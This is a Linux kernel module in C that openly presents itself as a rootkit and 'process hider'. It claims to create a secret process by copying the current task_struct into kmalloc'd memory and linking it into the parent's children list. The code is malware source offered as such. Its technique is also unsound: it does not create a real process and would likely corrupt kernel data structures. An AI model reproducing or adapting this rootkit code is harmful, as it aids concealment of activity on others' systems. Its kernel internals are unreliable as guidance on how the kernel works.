#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/slab.h>
#include <linux/signal.h>

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Improved Process Hider");
MODULE_AUTHOR("Anonymous");

struct task_struct *secret_task;

static int create_secret_process(void) {
    struct task_struct *current_task = current;

    // Alocar memória para o processo secreto
    secret_task = kmalloc(sizeof(struct task_struct), GFP_KERNEL);
    if (!secret_task) {
        printk(KERN_ERR "Rootkit: Memory allocation for secret task failed\n");
        return -ENOMEM;
    }

    // Copiar informações do processo atual
    memcpy(secret_task, current_task, sizeof(struct task_struct));
    secret_task->state = TASK_RUNNING;
    secret_task->exit_signal = SIGKILL;
    secret_task->on_cpu = 0;
    secret_task->nr_cpus_allowed = 1;
    secret_task->flags &= ~PF_KTHREAD;

    // Adicionar processo secreto à lista de processos do pai
    list_add(&secret_task->tasks, &current_task->children);
    current_task->signal->nr_threads++;

    printk(KERN_INFO "Rootkit: Secret process created and added to task list\n");
    return 0;
}

static void remove_secret_process(void) {
    if (secret_task) {
        // Remover processo secreto da lista de processos
        list_del(&secret_task->tasks);
        kfree(secret_task);
        secret_task = NULL;
        printk(KERN_INFO "Rootkit: Secret process removed and memory freed\n");
    }
}

static int __init init_rootkit(void) {
    printk(KERN_INFO "Rootkit: Initializing\n");

    int result = create_secret_process();
    if (result) {
        printk(KERN_ERR "Rootkit: Failed to create secret process\n");
        return result;
    }

    printk(KERN_INFO "Rootkit: Initialization complete\n");
    return 0;
}

static void __exit exit_rootkit(void) {
    printk(KERN_INFO "Rootkit: Exiting\n");
    remove_secret_process();
    printk(KERN_INFO "Rootkit: Exit complete\n");
}

module_init(init_rootkit);
module_exit(exit_rootkit);
